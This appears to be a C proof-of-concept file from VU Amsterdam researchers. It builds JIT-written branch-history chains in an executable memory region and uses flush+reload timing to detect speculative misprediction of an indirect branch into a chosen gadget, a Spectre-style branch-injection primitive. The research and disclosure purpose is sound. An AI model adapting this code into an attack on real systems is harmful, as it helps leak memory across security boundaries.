/*
 * Thursday, September 9th 2021
 *
 * Enrico Barberis - e.barberis@vu.nl
 * Pietro Frigo - p.frigo@vu.nl
 * Marius Muench - m.muench@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <sys/mman.h> 
#include <assert.h>
#include <time.h>
#include <errno.h>
#include "targets.h"
#include "helper.h"
#include "flush_reload.h"

#define ITERS               100
#define OFF_MASK            0xffffffffULL
#define RWX_SIZE	    (OFF_MASK+1ULL)
#define VERBOSE             1
#define IN_PLACE            1

//c3                      retq   
#define RET_GADGET			"\xc3"

//48 8b 06                mov    (%rsi),%rax
//c3                      retq   
#define HIT_GADGET			"\x48\x8b\x06\xc3"

//ff 27                   jmpq   *(%rdi)
#define IND_BRANCH			"\xff\x27"		

#define REL_BRANCH          "\xe9\x00\x00\x00\x00\xcc"
#define REL_BRANCH_SIZE     5

#define MAX_INSNS_SIZE      8

typedef uint64_t (*t_chain)(void *target, void *arg);

typedef void (*t_target)(void *target);
extern void ret_gadget(void *arg);
extern void hit_gadget(void *arg);
t_target ftable[2] = {&ret_gadget, hit_gadget};

void jit(uint8_t *rwx, uint64_t *history)
{
    for(int i=0; i<HISTORY_SIZE-1; i++)
    {
        int32_t off = ((int32_t) history[i+1]) - ((int32_t) history[i] + REL_BRANCH_SIZE);
        memcpy(&rwx[history[i]],   REL_BRANCH, sizeof(REL_BRANCH));
        memcpy(&rwx[history[i]+1], &off, sizeof(int32_t));
    }
    memcpy(&rwx[history[HISTORY_SIZE-1]], IND_BRANCH, sizeof(IND_BRANCH));

    //Avoid SMC.MC for performance improvement
    fence();
}

int main(int argc, char **argv)
{
    uint8_t *rwx;
    uint8_t *fr_buf;
    uint64_t rnd;
    uint8_t ok;
    uint64_t round;
    uint64_t hits;
    uint64_t hit_history[HISTORY_SIZE];
    uint64_t ret_history[HISTORY_SIZE];

    srand(time(0));
    
    fr_buf = mmap(NULL, STRIDE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    assert(fr_buf != MAP_FAILED);
    memset(fr_buf, 0x41, STRIDE);

    rwx = mmap(NULL, RWX_SIZE, PROT_WRITE|PROT_READ|PROT_EXEC,
				MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
    assert(rwx != MAP_FAILED);


    //TODO self collisions are possible but exremely unlikely, if program crashes
    //just rerun it with a different seed
    for(int i=0; i<HISTORY_SIZE; i++)
    {
        hit_history[i] = rand() & OFF_MASK;
    }
    jit(rwx, hit_history);
    t_chain hit_ptr = (t_chain) &rwx[hit_history[0]];
    hit_ptr(&ftable[1], fr_buf);

    round = 0;
    while(1)
    {
        round++;
        hits = 0;

#if VERBOSE == 1
        printf("\r[Round %12ld]", round);
        fflush(stdout);
#endif
    
        //Create a random ret_history
        for(int i=0; i<HISTORY_SIZE; i++)
        {
            ok = 0;
            while(!ok)
            {
                ok = 1;
                rnd = rand() & OFF_MASK;
                
                //Ensure we do not go out the rwx area
                if (rnd > RWX_SIZE - MAX_INSNS_SIZE)
                {
                    ok = 0;
                    continue;
                }

                //Avoid self collision
                for(int j=0; j<i; j++)
                {
                    if(labs((int64_t)(rnd - ret_history[j])) < MAX_INSNS_SIZE)
                    {
                        ok = 0;
                        break; 
                    }
                }

                //Avoid collision with hit_history
                for(int j=0; j<HISTORY_SIZE; j++)
                {
                    if(labs((int64_t)(rnd - hit_history[j])) < MAX_INSNS_SIZE)
                    {
                        ok = 0;
                        break; 
                    }
                }
            }

            ret_history[i] = rnd;
        }

#if IN_PLACE == 1
        ret_history[HISTORY_SIZE-1] = hit_history[HISTORY_SIZE-1];
#endif
    
        jit(rwx, ret_history);
        t_chain ret_ptr = (t_chain) &rwx[ret_history[0]];
        ret_ptr(&ftable[0], NULL);

        for(int i=0; i<ITERS; i++)
        {
            //Usually 1 training run is sufficient
            hit_ptr(&ftable[1], fr_buf);

            clflush(fr_buf);
            clflush(&ftable[0]);
            clflush(&ftable[0]);
            fence();

            //Execute ret_gadget hoping it will mispredict to hit_gadget
            ret_ptr(&ftable[0], fr_buf);

            //Reload
            fence();   //Ensure all memory operations are done
            if (load_time(fr_buf) < THR) hits++;
        }

        if(hits > ITERS/2)
        {
            printf("hits: %8ld/%d\tround: %8ld", hits, ITERS, round);
#if VERBOSE == 1
            printf("\tind_branches={%p,%p}", &rwx[hit_history[HISTORY_SIZE-1]], &rwx[ret_history[HISTORY_SIZE-1]]);
#endif
            printf("\n");

            round = 0;
        }
    }
	
    return 0;
}

